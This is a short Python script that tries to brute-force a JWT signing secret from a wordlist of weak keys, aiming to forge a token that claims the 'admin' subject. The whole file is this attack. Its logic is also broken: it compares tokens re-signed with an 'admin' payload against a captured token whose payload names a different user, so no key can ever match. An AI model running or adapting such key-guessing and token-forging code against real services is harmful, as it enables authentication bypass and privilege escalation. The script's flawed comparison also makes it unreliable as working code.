import jwt

original_payload = {"sub": "admin", "exp": 1744304828}
wordlist = ["secret", "admin", "jwtkey", "password", "passkey", "123456", "letmein", "qwerty", "abc123", "forgerykey"]

my_token = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0dXNlcjEyMyIsImV4cCI6MTc0NDMwNDgyOH0.BBPCjrcU58VfQbQJRXhvxsEBNF-hZ3_QWkBDwEBgXrU"
for secret in wordlist:
    try:
        token = jwt.encode(original_payload, secret, algorithm="HS256")
        # print(f"Forged Token with key '{secret}':", token)
        if token == my_token:
            print(f"Token matched with key '{secret}'")
            break
    except Exception as e:
        print(f"Error with key '{secret}':", str(e))
        continue
        
